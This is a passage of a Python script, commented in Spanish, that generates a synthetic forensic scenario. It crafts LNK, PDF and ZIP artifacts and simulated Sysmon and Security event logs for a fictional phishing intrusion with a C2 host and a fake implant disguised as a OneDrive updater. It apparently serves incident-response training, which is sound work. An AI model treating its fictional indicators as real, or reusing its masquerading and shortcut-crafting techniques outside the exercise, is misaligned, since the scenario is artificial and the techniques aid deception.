        li = struct.pack("<IIIIIII", 0, 0x1C, 2, 0, 0, 0x1C, 0x1C + len(cnrl)) + cnrl + suffix
    li = struct.pack("<I", len(li)) + li[4:]
    body += li
    for flag, val in ((0x4, name), (0x8, rel), (0x10, workdir), (0x20, args), (0x40, icon)):
        if val is not None:
            flags |= flag
            body += _lnk_str(val)
    extra = b""
    if icon_env:
        flags |= 0x4000
        extra += struct.pack("<II", 0x314, 0xA0000007) + icon_env.encode("cp1252").ljust(260, b"\0") + \
            icon_env.encode("utf-16-le").ljust(520, b"\0")
    if known_folder:
        kf_guid, csidl, idx = known_folder
        extra += struct.pack("<III", 0x10, 0xA0000005, csidl) + struct.pack("<I", offs[idx] + 2)
        extra += struct.pack("<II", 0x1C, 0xA000000B) + guid_bytes(kf_guid) + struct.pack("<I", offs[idx] + 2)
    extra += struct.pack("<IIII", 0x60, 0xA0000003, 0x58, 0) + machine.encode().ljust(16, b"\0")[:16] + \
        vol_droid.bytes_le + obj_droid.bytes_le + vol_droid.bytes_le + obj_droid.bytes_le
    extra += b"\0\0\0\0"
    c, a, w = target_times
    hdr = struct.pack("<I", 0x4C) + guid_bytes(LNK_CLSID) + struct.pack("<II", flags, attrs) + \
        struct.pack("<QQQIiIH", c, a, w, target_size, icon_index, show, 0) + b"\0" * 10
    return hdr + body + extra


# ======================================================================= PDF, ZIP
def build_pdf(lines, title, author, producer, created):
    """PDF 1.7 de una página con texto en Helvetica. created: 'D:20261005094800+02\\'00\\''."""
    def esc(s):
        return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    y, ops = 790, ["BT"]
    for size, text in lines:
        ops.append(f"/F1 {size} Tf 1 0 0 1 56 {y} Tm ({esc(text)}) Tj")
        y -= size + 9
    ops.append("ET")
    stream = "\n".join(ops).encode("cp1252")
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
        f"<< /Title ({esc(title)}) /Author ({esc(author)}) /Producer ({esc(producer)}) /CreationDate ({created}) /ModDate ({created}) >>".encode("cp1252"),
    ]
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offs = []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    for o in offs:
        out += f"{o:010d} 00000 n \n".encode()
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R /Info 6 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return bytes(out)


def ntfs_extra(mtime, atime, ctime):
    """Campo extra 0x000A de ZIP con las tres marcas NTFS (lo escribe 7-Zip)."""
    return struct.pack("<HHIHHQQQ", 0x000A, 32, 0, 1, 24, mtime, atime, ctime)


def b64_lines(data, width):
    s = base64.b64encode(data).decode()
    return "\r\n".join(s[i:i + width] for i in range(0, len(s), width))


def qp(text):
    import quopri
    return quopri.encodestring(text.encode("utf-8")).decode().replace("\n", "\r\n")


# ======================================================================= ESCENARIO: identidades
HOST = "KB-FIN-WS03"
FQDN = "KB-FIN-WS03.kelbrook.internal"
DOMAIN, DNSDOM = "KELBROOK", "kelbrook.internal"
WS_IP, DC_IP, FS_IP, GW_IP = "10.20.30.61", "10.20.30.3", "10.20.30.45", "10.20.30.1"
PHISH_MTA, PHISH_CLIENT, C2_IP = "198.51.100.89", "203.0.113.201", "203.0.113.58"
C2_HOST = "cdn.ardeal-lab.net"
WS_MAC = "a4:bb:6d:3e:91:07"
ATK_MAC = "08:00:27:5e:a1:3c"
DOMAIN_SID = "S-1-5-21-3021476520-1873542967-2461890375"
LMARIN_SID, JTORRES_SID = DOMAIN_SID + "-1108", DOMAIN_SID + "-1115"
SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
SEC_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
MACHINE_GUID_PART = 0x8D1F6B2A

INSTALL = FT(2026, 3, 16, 9, 12, 4.5)          # instalación del equipo (volumen C:)
SYSMON_DEPLOY_DAY = (10, 1)                      # GPO de Sysmon: 01/10
ATTACK_DAY = 13
TRIAGE_START = T(13, 10, 10, 15.42)
C_SERIAL, E_SERIAL = 0x5A1E3C7D, 0x1C2B3A4D
VOL_C = "\\VOLUME{%016x-%08x}" % (INSTALL, C_SERIAL)
USB_CREATED = FT(2025, 2, 20, 11, 4, 51.2)
VOL_E = "\\VOLUME{%016x-%08x}" % (USB_CREATED, E_SERIAL)

def is_dst(ft):
    return FT(2026, 3, 29, 1) <= ft < FT(2026, 10, 25, 1)

def LOCAL(mo, d, h, mi, s=0.0):
    """Hora local de Madrid -> FILETIME UTC."""
    ft = FT(2026, mo, d, h, mi, s) - 3600 * TICKS
    return ft - 3600 * TICKS if is_dst(ft - 3600 * TICKS) else ft

USERS = {
    "system":  ("S-1-5-18", "SYSTEM", "NT AUTHORITY", 0x3E7),
    "local":   ("S-1-5-19", "LOCAL SERVICE", "NT AUTHORITY", 0x3E5),
    "network": ("S-1-5-20", "NETWORK SERVICE", "NT AUTHORITY", 0x3E4),
    "dwm":     ("S-1-5-90-0-1", "DWM-1", "Window Manager", None),
    "umfd0":   ("S-1-5-96-0-0", "UMFD-0", "Font Driver Host", None),
    "umfd1":   ("S-1-5-96-0-1", "UMFD-1", "Font Driver Host", None),
    "lmarin":  (LMARIN_SID, "lmarin", DOMAIN, None),
    "jtorres": (JTORRES_SID, "adm.jtorres", DOMAIN, None),
}
INTEGRITY_SID = {"System": "S-1-16-16384", "High": "S-1-16-12288", "Medium": "S-1-16-8192",
                 "Low": "S-1-16-4096", "AppContainer": "S-1-16-4096"}

# Metadatos de imagen: (FileVersion, Description, Product, Company, OriginalFileName)
MS = "Microsoft Corporation"
WINP = "Microsoft® Windows® Operating System"
WV = "10.0.26100.6899 (WinBuild.160101.0800)"
IMG = {}
def _img(path, desc, orig, product=WINP, company=MS, ver=WV):
    IMG[path.lower()] = (ver, desc, product, company, orig)
for p, d, o in [
    (r"C:\Windows\System32\smss.exe", "Windows Session Manager", "smss.exe"),
    (r"C:\Windows\System32\csrss.exe", "Client Server Runtime Process", "CSRSS.Exe"),
    (r"C:\Windows\System32\wininit.exe", "Windows Start-Up Application", "WinInit.exe"),
    (r"C:\Windows\System32\winlogon.exe", "Windows Logon Application", "WINLOGON.EXE"),
    (r"C:\Windows\System32\services.exe", "Services and Controller app", "services.exe"),
    (r"C:\Windows\System32\lsass.exe", "Local Security Authority Process", "lsass.exe"),
    (r"C:\Windows\System32\svchost.exe", "Host Process for Windows Services", "svchost.exe"),
    (r"C:\Windows\System32\fontdrvhost.exe", "Usermode Font Driver Host", "fontdrvhost.exe"),
    (r"C:\Windows\System32\LogonUI.exe", "Windows Logon User Interface Host", "logonui.exe"),
    (r"C:\Windows\System32\dwm.exe", "Desktop Window Manager", "dwm.exe"),
    (r"C:\Windows\System32\spoolsv.exe", "Spooler SubSystem App", "spoolsv.exe"),
    (r"C:\Windows\System32\SearchIndexer.exe", "Microsoft Windows Search Indexer", "SearchIndexer.exe"),
    (r"C:\Windows\System32\SearchProtocolHost.exe", "Microsoft Windows Search Protocol Host", "SearchProtocolHost.exe"),
    (r"C:\Windows\System32\SearchFilterHost.exe", "Microsoft Windows Search Filter Host", "SearchFilterHost.exe"),
    (r"C:\Windows\System32\wbem\WmiPrvSE.exe", "WMI Provider Host", "Wmiprvse.exe"),
    (r"C:\Windows\System32\userinit.exe", "Userinit Logon Application", "USERINIT.EXE"),
    (r"C:\Windows\explorer.exe", "Windows Explorer", "EXPLORER.EXE"),
    (r"C:\Windows\System32\sihost.exe", "Shell Infrastructure Host", "sihost.exe"),
    (r"C:\Windows\System32\taskhostw.exe", "Host Process for Windows Tasks", "taskhostw.exe"),
    (r"C:\Windows\System32\ctfmon.exe", "CTF Loader", "CTFMON.EXE"),
    (r"C:\Windows\System32\RuntimeBroker.exe", "Runtime Broker", "RuntimeBroker.exe"),
    (r"C:\Windows\System32\dllhost.exe", "COM Surrogate", "dllhost.exe"),
    (r"C:\Windows\System32\backgroundTaskHost.exe", "Background Task Host", "backgroundTaskHost.exe"),
    (r"C:\Windows\System32\conhost.exe", "Console Window Host", "CONHOST.EXE"),
    (r"C:\Windows\System32\cmd.exe", "Windows Command Processor", "Cmd.Exe"),
    (r"C:\Windows\System32\whoami.exe", "whoami - displays logged on user information", "whoami.exe"),
    (r"C:\Windows\System32\ipconfig.exe", "IP Configuration Utility", "ipconfig.exe"),
    (r"C:\Windows\System32\net.exe", "Net Command", "net.exe"),
    (r"C:\Windows\System32\net1.exe", "Net Command", "net1.exe"),
    (r"C:\Windows\System32\nltest.exe", "Microsoft® Logon Server Test Utility", "nltestrk.exe"),
    (r"C:\Windows\System32\tar.exe", "bsdtar archive tool", "bsdtar"),
    (r"C:\Windows\System32\curl.exe", "The curl executable", "curl.exe"),
    (r"C:\Windows\System32\gpscript.exe", "Group Policy Script Application", "GPSCRIPT.EXE"),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "Windows PowerShell", "PowerShell.EXE"),
    (r"C:\Windows\System32\smartscreen.exe", "Windows Defender SmartScreen", "smartscreen.exe"),
    (r"C:\Windows\System32\audiodg.exe", "Windows Audio Device Graph Isolation", "audiodg.exe"),
    (r"C:\Windows\System32\CompatTelRunner.exe", "Microsoft Compatibility Telemetry", "CompatTelRunner.exe"),
    (r"C:\Windows\System32\MoUsoCoreWorker.exe", "MoUSO Core Worker Process", "MoUsoCoreWorker.exe"),
    (r"C:\Windows\System32\sppsvc.exe", "Microsoft Software Protection Platform Service", "sppsvc.exe"),
    (r"C:\Windows\System32\SecurityHealthService.exe", "Windows Security Health Service", "SecurityHealthService.exe"),
    (r"C:\Windows\System32\SecurityHealthSystray.exe", "Windows Security notification icon", "SecurityHealthSystray.exe"),
    (r"C:\Windows\System32\consent.exe", "Consent UI for administrative applications", "consent.exe"),
    (r"C:\Windows\System32\gpupdate.exe", "Microsoft® Windows Group Policy Update Utility", "GPUpdate.exe"),
    (r"C:\Windows\System32\mmc.exe", "Microsoft Management Console", "mmc.exe"),
    (r"C:\Windows\System32\PING.EXE", "TCP/IP Ping Command", "ping.exe"),
    (r"C:\Windows\servicing\TrustedInstaller.exe", "Windows Modules Installer", "TrustedInstaller.exe"),
    (r"C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.6899_none_3f8f0c3e6b0d8a51\TiWorker.exe", "Windows Modules Installer Worker", "TiWorker.exe"),
]:
    _img(p, d, o)
for p, d, o, prod, ver in [
    (r"C:\Windows\Sysmon64.exe", "System activity monitor", "Sysmon.exe", "Sysinternals Sysmon", "15.15"),
    (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MsMpEng.exe", "Antimalware Service Executable", "MsMpEng.exe", "Microsoft® Windows® Operating System", "4.18.25090.3009 (a62c7e3d1e2f4f87fa5b3e8a7f0c3d1b9e5a2f40)"),
    (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\NisSrv.exe", "Microsoft Network Realtime Inspection Service", "NisSrv.exe", "Microsoft® Windows® Operating System", "4.18.25090.3009 (a62c7e3d1e2f4f87fa5b3e8a7f0c3d1b9e5a2f40)"),
    (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MpCmdRun.exe", "Microsoft Malware Protection Command Line Utility", "MpCmdRun.exe", "Microsoft® Windows® Operating System", "4.18.25090.3009 (a62c7e3d1e2f4f87fa5b3e8a7f0c3d1b9e5a2f40)"),
    (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MpDefenderCoreService.exe", "Antimalware Core Service", "MpDefenderCoreService.exe", "Microsoft® Windows® Operating System", "4.18.25090.3009 (a62c7e3d1e2f4f87fa5b3e8a7f0c3d1b9e5a2f40)"),
    (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "Microsoft Edge", "msedge.exe", "Microsoft Edge", "141.0.3537.71"),
    (r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe", "Microsoft Edge Update", "MicrosoftEdgeUpdate.exe", "Microsoft Edge Update", "1.3.207.39"),
    (r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\141.0.3537.71\msedgewebview2.exe", "Microsoft Edge WebView2", "msedgewebview2.exe", "Microsoft Edge WebView2", "141.0.3537.71"),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "Microsoft Outlook", "Outlook.exe", "Microsoft Outlook", "16.0.19231.20150"),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "Microsoft Excel", "Excel.exe", "Microsoft Office", "16.0.19231.20150"),
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "Microsoft Word", "WinWord.exe", "Microsoft Office", "16.0.19231.20150"),
    (r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe", "Microsoft Office Click-to-Run (SxS)", "OfficeClickToRun.exe", "Microsoft Office", "16.0.19231.20150"),
    (r"C:\Program Files\WindowsApps\MSTeams_25255.703.3981.7231_x64__8wekyb3d8bbwe\ms-teams.exe", "Microsoft Teams", "ms-teams.exe", "Microsoft Teams", "25255.703.3981.7231"),
    (r"C:\Users\lmarin\AppData\Local\Microsoft\OneDrive\OneDrive.exe", "Microsoft OneDrive", "OneDrive.exe", "Microsoft OneDrive", "25.184.0921.0002"),
    (r"C:\Users\lmarin\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe", "Standalone Updater", "OneDriveStandaloneUpdater.exe", "Microsoft OneDrive", "25.184.0921.0002"),
    (r"C:\Program Files\Realtek\Audio\HDA\RtkAudUService64.exe", "Realtek HD Audio Universal Service", "RtkAudUService64.exe", "Realtek HD Audio Universal Service", "1.0.0.1213"),
]:
    _img(p, d, o, prod, MS if "Realtek" not in p else "Realtek Semiconductor", ver)
for p in (r"C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe",
          r"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe",
          r"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe",
          r"C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"):
    name = p.rsplit("\\", 1)[1]
    _img(p, name.replace(".exe", ""), name)

# Implante (no existe el binario: solo sus metadatos y hashes)
IMPLANT = r"C:\Users\lmarin\AppData\Local\Microsoft\OneDrive\Update\OneDriveUpdater.exe"
IMPLANT_SIZE = 412160
IMG[IMPLANT.lower()] = ("1.4.2.0", "Runtime Agent", "OneDrive Updater", "-", "rtagent.exe")
_ib = hashlib.sha512(b"kelbrook-03-implante-ficticio").digest() * 6500
IMPLANT_BYTES = _ib[:IMPLANT_SIZE]
KAPE = r"E:\KAPE\kape.exe"
IMG[KAPE.lower()] = ("1.3.0.2", "KAPE", "KAPE", "Kroll", "kape.exe")


def hashes(path):
    """MD5, SHA256, IMPHASH y SHA1 de la imagen (ficticios salvo coherencia entre artefactos)."""
    if path.lower() == IMPLANT.lower():
        b = IMPLANT_BYTES
        return (hashlib.md5(b).hexdigest().upper(), hashlib.sha256(b).hexdigest().upper(),
                "F34D5F2D4577ED6D9CEEC516C1F5A744", hashlib.sha1(b).hexdigest())
    seed = path.lower().encode()
    return (hashlib.md5(seed + b"md5").hexdigest().upper(), hashlib.sha256(seed + b"sha").hexdigest().upper(),
            hashlib.md5(seed + b"imp").hexdigest().upper(), hashlib.sha1(seed + b"sha1").hexdigest())


# ======================================================================= MOTOR DE SIMULACIÓN
CH = ("Security", "System", "Application", "Sysmon", "PSOp", "PS", "Defender")
CHANNEL_NAME = {"Security": "Security", "System": "System", "Application": "Application",
                "Sysmon": "Microsoft-Windows-Sysmon/Operational",
                "PSOp": "Microsoft-Windows-PowerShell/Operational", "PS": "Windows PowerShell",
                "Defender": "Microsoft-Windows-Windows Defender/Operational"}
S = EvtType


class Proc:
    __slots__ = ("pid", "guid", "image", "cmd", "parent", "user", "logon", "lguid", "session",
                 "integrity", "start", "end", "cwd", "elev")

    @property
    def name(self):
        return self.image.rsplit("\\", 1)[-1]


class Logon:
    def __init__(self, user, lid, lguid):
        self.user, self.id, self.guid = user, lid, lguid


class Sim:
    def __init__(self):
        self.ev = {c: [] for c in CH}
        self.rng = random.Random(1013)
        self.execs = {}            # imagen -> [(t, proc)]
        self.pids = set()
        self.boot_t = None
        self.sysmon_from = None    # instante desde el que Sysmon registra en esta sesión de arranque
        self.audit_from = None
        self.sysmon_installed = False
        self.sysmon_pid = 0
        self.lsass_pid = 0
        self.procs = {}            # nombre lógico -> Proc (dentro del arranque)
        self.logons = {}
        self.shutdown_t = None
        self.reg_events = []       # (t, ruta, valor, tipo, dato) para construir las colmenas
        self.edge = []             # (t, url, título, transición)
        self.recent = []           # (t, ruta destino, tipo)
        self.userassist = {}

    # --------------------------------------------------------------- utilidades
    def tid(self):
        return self.rng.randrange(400, 12000, 4)

    def new_pid(self):
        while True:
            p = self.rng.randrange(600, 16000, 4)
            if p not in self.pids:
                self.pids.add(p)
                return p

    def proc_guid(self, t, pid):
        u = int(ft2unix(t))
        return "{%08x-%04x-%04x-%04x-%012x}" % (MACHINE_GUID_PART, u & 0xFFFF, u >> 16,
                                               (pid * 0x9E37) & 0xFFFF, 0x1000 + (pid >> 2))

    def logon_guid(self, t, lid):
        u = int(ft2unix(t))
        b = struct.pack("<Q", lid)
        return "{%08x-%04x-%04x-%s-%s}" % (MACHINE_GUID_PART, u & 0xFFFF, u >> 16, b[:2].hex(), b[2:].hex())

    def user_str(self, ukey):
        sid, name, dom, _ = USERS[ukey]
        return f"{dom}\\{name}"

    def logon_id(self, ukey):
        if USERS[ukey][3] is not None:
            return USERS[ukey][3]
        return self.logons[ukey].id

    # --------------------------------------------------------------- emisores
    def add(self, ch, ev):
        ev.channel = CHANNEL_NAME[ch]
        self.ev[ch].append(ev)

    def sysmon(self, t, eid, ver, fields):
        if self.sysmon_from is None or t < self.sysmon_from:
            return
        self.add("Sysmon", Event(t, "Microsoft-Windows-Sysmon", eid, fields, guid=SYSMON_GUID, ver=ver,
                                 task=eid, pid=self.sysmon_pid, tid=self.rng.choice((3320, 3412, 5076, 4416)),
                                 user="S-1-5-18"))

    def sec(self, t, eid, task, fields, ver=0, pid=None, kw=0x8020000000000000):
        if self.audit_from is None or t < self.audit_from:
            return
        self.add("Security", Event(t, "Microsoft-Windows-Security-Auditing", eid, fields, guid=SEC_GUID,
                                   ver=ver, level=0, task=task, kw=kw,
                                   pid=self.lsass_pid if pid is None else pid, tid=self.tid()))

    def sys(self, t, provider, eid, fields, ch="System", guid=None, esn=None, qual=None, ver=0, level=4,
            task=0, opcode=0, kw=0x8000000000000000, pid=None, user=None, activity=None):
        self.add(ch, Event(t, provider, eid, fields, guid=guid, esn=esn, qual=qual, ver=ver, level=level,
                           task=task, opcode=opcode, kw=kw, pid=self.rng.choice((4, 1168, 1524, 2036)) if pid is None else pid,
                           tid=self.tid(), user=user, activity=activity))

    # --------------------------------------------------------------- procesos
    def spawn(self, t, image, cmd, parent, ukey, integrity="Medium", session=None, cwd=None, life=None,
              elev=None, rule="-", key=None, log=True):
        p = Proc()
        p.pid, p.image, p.cmd, p.parent, p.user = self.new_pid(), image, cmd, parent, ukey
        p.start, p.end = t, (t + sec(life)) if life else None
        p.session = session if session is not None else (0 if ukey in ("system", "local", "network") else 1)
        p.integrity = integrity
        p.cwd = cwd or (r"C:\Windows\system32" + "\\" if ukey in ("system", "local", "network")
                        else (rf"C:\Users\{USERS[ukey][1]}" + "\\" if ukey in ("lmarin", "jtorres") else r"C:\Windows\system32" + "\\"))
        p.elev = elev
        p.guid = self.proc_guid(t, p.pid)
        lid = self.logon_id(ukey)
        p.logon = lid
        p.lguid = self.logons[ukey].guid if ukey in self.logons else self.logon_guid(self.boot_t, lid)
        self.execs.setdefault(image.lower(), []).append((t, p))
        if key:
            self.procs[key] = p
        if not log:
            return p
        ver, desc, prod, comp, orig = IMG.get(image.lower(), ("-", "-", "-", "-", "-"))
        md5, sha256, imp, _ = hashes(image)
        par = parent
        self.sysmon(t, 1, 5, [
            ("RuleName", S.STR, rule), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("Image", S.STR, image), ("FileVersion", S.STR, ver),
            ("Description", S.STR, desc), ("Product", S.STR, prod), ("Company", S.STR, comp),
            ("OriginalFileName", S.STR, orig), ("CommandLine", S.STR, cmd), ("CurrentDirectory", S.STR, p.cwd),
            ("User", S.STR, self.user_str(ukey)), ("LogonGuid", S.GUID, p.lguid), ("LogonId", S.HEX64, lid),
            ("TerminalSessionId", S.U32, p.session), ("IntegrityLevel", S.STR, integrity),
            ("Hashes", S.STR, f"MD5={md5},SHA256={sha256},IMPHASH={imp}"),
            ("ParentProcessGuid", S.GUID, par.guid if par else "{00000000-0000-0000-0000-000000000000}"),
            ("ParentProcessId", S.U32, par.pid if par else 4),
            ("ParentImage", S.STR, par.image if par else "System"),
            ("ParentCommandLine", S.STR, par.cmd if par else ""),
            ("ParentUser", S.STR, self.user_str(par.user) if par else "NT AUTHORITY\\SYSTEM")])
        # 4688: el sujeto es la cuenta del proceso creador; el destino, la del nuevo si es otra
        cu = par.user if par else "system"
        csid, cname, cdom, _ = USERS[cu]
        if cu == "system":
            cname, cdom = HOST + "$", DOMAIN
        tsid, tname, tdom, _ = USERS[ukey]
        same = cu == ukey
        if elev is None:
            elev = "%%1936" if ukey not in ("jtorres",) else "%%1938"
        self.sec(t, 4688, 13312, [
            ("SubjectUserSid", S.SID, csid), ("SubjectUserName", S.STR, cname), ("SubjectDomainName", S.STR, cdom),
            ("SubjectLogonId", S.HEX64, self.logon_id(cu)), ("NewProcessId", S.HEX64, p.pid),
            ("NewProcessName", S.STR, image), ("TokenElevationType", S.STR, elev),
            ("ProcessId", S.HEX64, par.pid if par else 4), ("CommandLine", S.STR, cmd),
            ("TargetUserSid", S.SID, "S-1-0-0" if same else tsid),
            ("TargetUserName", S.STR, "-" if same else (HOST + "$" if ukey == "system" else tname)),
            ("TargetDomainName", S.STR, "-" if same else (DOMAIN if ukey == "system" else tdom)),
            ("TargetLogonId", S.HEX64, 0 if same else lid),
            ("ParentProcessName", S.STR, par.image if par else ""),
            ("MandatoryLabel", S.SID, INTEGRITY_SID[integrity if integrity in INTEGRITY_SID else "Medium"])],
            ver=2, pid=4)
        if life:
            self.exit(p, t + sec(life))
        return p

    def exit(self, p, t):
        if self.shutdown_t and t >= self.shutdown_t:
            return
        p.end = t
        self.sysmon(t, 5, 3, [("RuleName", S.STR, "-"), ("UtcTime", S.STR, iso(t, 3)),
                              ("ProcessGuid", S.GUID, p.guid), ("ProcessId", S.U32, p.pid),
                              ("Image", S.STR, p.image), ("User", S.STR, self.user_str(p.user))])

    def net(self, t, p, dst_ip, dst_port, dst_host="-", src_port=None, proto="tcp", rule="-"):
        sp = src_port or self.rng.randint(49700, 65000)
        self.sysmon(t, 3, 5, [
            ("RuleName", S.STR, rule), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("Image", S.STR, p.image), ("User", S.STR, self.user_str(p.user)),
            ("Protocol", S.STR, proto), ("Initiated", S.BOOL, True), ("SourceIsIpv6", S.BOOL, False),
            ("SourceIp", S.STR, WS_IP), ("SourceHostname", S.STR, FQDN), ("SourcePort", S.U16, sp),
            ("SourcePortName", S.STR, "-"), ("DestinationIsIpv6", S.BOOL, False), ("DestinationIp", S.STR, dst_ip),
            ("DestinationHostname", S.STR, dst_host), ("DestinationPort", S.U16, dst_port),
            ("DestinationPortName", S.STR, {443: "https", 80: "http", 445: "microsoft-ds"}.get(dst_port, "-"))])

    def dns(self, t, p, name, ips, status="0"):
        res = "".join(f"::ffff:{ip};" for ip in ips) if ips else "-"
        self.sysmon(t, 22, 5, [
            ("RuleName", S.STR, "-"), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("QueryName", S.STR, name), ("QueryStatus", S.STR, status),
            ("QueryResults", S.STR, res), ("Image", S.STR, p.image), ("User", S.STR, self.user_str(p.user))])

    def fcreate(self, t, p, path, ctime=None, rule="-"):
        self.sysmon(t, 11, 2, [
            ("RuleName", S.STR, rule), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("Image", S.STR, p.image), ("TargetFilename", S.STR, path),
            ("CreationUtcTime", S.STR, iso(ctime or t, 3)), ("User", S.STR, self.user_str(p.user))])

    def regset(self, t, p, target, details, rule="-"):
        self.sysmon(t, 13, 2, [
            ("RuleName", S.STR, rule), ("EventType", S.STR, "SetValue"), ("UtcTime", S.STR, iso(t, 3)),
            ("ProcessGuid", S.GUID, p.guid), ("ProcessId", S.U32, p.pid), ("Image", S.STR, p.image),
            ("TargetObject", S.STR, target), ("Details", S.STR, details), ("User", S.STR, self.user_str(p.user))])

    def stream(self, t, p, path, contents, rule="-"):
        h = hashlib.sha256(contents.encode()).hexdigest().upper()
        md5 = hashlib.md5(contents.encode()).hexdigest().upper()
        self.sysmon(t, 15, 2, [
            ("RuleName", S.STR, rule), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("Image", S.STR, p.image), ("TargetFilename", S.STR, path + ":Zone.Identifier"),
            ("CreationUtcTime", S.STR, iso(t, 3)), ("Hash", S.STR, f"MD5={md5},SHA256={h},IMPHASH=00000000000000000000000000000000"),
            ("Contents", S.STR, contents.replace("\r\n", "  ")), ("User", S.STR, self.user_str(p.user))])

    def fdelete(self, t, p, path, data_hash, is_exe=False, rule="-"):
        self.sysmon(t, 26, 5, [
            ("RuleName", S.STR, rule), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("User", S.STR, self.user_str(p.user)), ("Image", S.STR, p.image),
            ("TargetFilename", S.STR, path), ("Hashes", S.STR, data_hash), ("IsExecutable", S.BOOL, is_exe)])

    def fexe(self, t, p, path, rule="-"):
        md5, sha256, imp, _ = hashes(path)
        self.sysmon(t, 29, 5, [
            ("RuleName", S.STR, rule), ("UtcTime", S.STR, iso(t, 3)), ("ProcessGuid", S.GUID, p.guid),
            ("ProcessId", S.U32, p.pid), ("User", S.STR, self.user_str(p.user)), ("Image", S.STR, p.image),
            ("TargetFilename", S.STR, path), ("Hashes", S.STR, f"MD5={md5},SHA256={sha256},IMPHASH={imp}")])


GUIDS = {
    "Microsoft-Windows-Kernel-General": "{a68ca8b7-004f-d7b6-a698-07e2de0f1f5d}",
    "Microsoft-Windows-Kernel-Power": "{331c3b3a-2005-44c2-ac5e-77220c37d6b4}",
    "Microsoft-Windows-Kernel-Boot": "{15ca44ff-4d7a-4baa-bba5-0998955e531e}",
    "Microsoft-Windows-Kernel-Processor-Power": "{0f67e49f-fe51-4e9f-b490-6f2948cc6027}",
    "Microsoft-Windows-Winlogon": "{dbe9b383-7cf3-4331-91cc-a3cb16a3b538}",
    "Microsoft-Windows-Time-Service": "{06edcfeb-0fd0-4e53-acca-a6f8bbf81bcb}",
    "Microsoft-Windows-GroupPolicy": "{aea1b4fa-97d1-45f2-a64c-4d69fffd92c9}",
    "Microsoft-Windows-WindowsUpdateClient": "{945a8954-c147-4acd-923f-40c45405a658}",
    "Microsoft-Windows-DistributedCOM": "{1b562e86-b7aa-4131-badc-b6f3a001407e}",
    "Microsoft-Windows-DNS-Client": "{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}",
    "Service Control Manager": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
    "User32": "{b0aa8734-56f7-41cc-b2f4-de228e98b946}",
    "Microsoft-Windows-Security-SPP": "{e23b33b0-c8c9-472c-a5f9-f2bdfea0f156}",
    "Microsoft-Windows-RestartManager": "{0888e5ef-9b98-4695-979d-e92ce4247224}",
    "Microsoft-Windows-PowerShell": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
    "Microsoft-Windows-Windows Defender": "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}",
    "Microsoft-Windows-NCSI": "{314de49f-ce63-4779-ba2b-d616f6963a88}",
}

SVCHOSTS = [
    ("svc_dcom", "-k DcomLaunch -p", "system"), ("svc_rpcss", "-k RPCSS -p", "network"),
    ("svc_lsm", "-k DcomLaunch -p -s LSM", "system"), ("svc_netsvcs", "-k netsvcs -p -s Schedule", "system"),
    ("svc_gpsvc", "-k netsvcs -p -s gpsvc", "system"), ("svc_profsvc", "-k netsvcs -p -s ProfSvc", "system"),
    ("svc_eventlog", "-k LocalServiceNetworkRestricted -p -s EventLog", "local"),
    ("svc_dhcp", "-k LocalServiceNetworkRestricted -p -s Dhcp", "local"),
    ("svc_dns", "-k NetworkService -p -s Dnscache", "network"), ("svc_nla", "-k NetworkService -p -s NlaSvc", "network"),
